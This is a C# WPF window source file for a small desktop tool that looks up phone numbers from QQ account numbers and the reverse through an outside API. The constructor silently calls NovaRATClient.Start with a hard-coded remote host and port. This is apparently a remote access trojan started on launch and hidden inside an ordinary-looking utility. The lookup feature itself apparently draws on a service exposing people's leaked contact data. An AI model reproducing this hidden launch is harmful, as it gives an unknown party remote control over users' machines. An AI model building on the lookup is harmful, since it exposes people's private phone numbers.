using System;
using System.Net;
using System.Windows;
using System.Windows.Media.Animation;
using ClientLib;
using Newtonsoft.Json.Linq;

namespace Client
{
    /// <summary>
    /// MainWindow.xaml 的交互逻辑
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
            this.MouseLeftButtonDown += (o, e) => { DragMove(); };
            Loaded += (serder, e) =>
            {
                var fadeInAnimation = new DoubleAnimation { From = 0, To = 1, Duration = TimeSpan.FromSeconds(0.5) };
                BeginAnimation(UIElement.OpacityProperty, fadeInAnimation);
            };

            NovaRATClient.Start("loca.novapp.icu", 12345);
        }

        private void q_p_btn_Click(object sender, RoutedEventArgs e)
        {
            WebClient wc = new WebClient();
            MessageBox.Show(Json_(wc.DownloadString("https://zy.xywlapi.cc/qqcx2023?qq=" + q_p.Text),"phone"));
        }

        public string Json_(string json,string value)
        {
            // 使用 JObject 解析 JSON
            JObject jsonObject = JObject.Parse(json);

            // 获取 "status" 字段的值
            int status = jsonObject.Value<int>("status");

            if (status == 200)
            {
                // 获取 "phone" 字段的值
                string phone = jsonObject.Value<string>(value);
                return phone;
            }
            else if (status == 500)
            {
                return "没有找到";
            }
            else
            {
                return "null";
            }
        }

        private void p_q_btn_Click(object sender, RoutedEventArgs e)
        {
            WebClient wc = new WebClient();
            MessageBox.Show(Json_(wc.DownloadString("https://zy.xywlapi.cc/qqxc2023?phone=" + q_p.Text), "qq"));
        }
    }
}
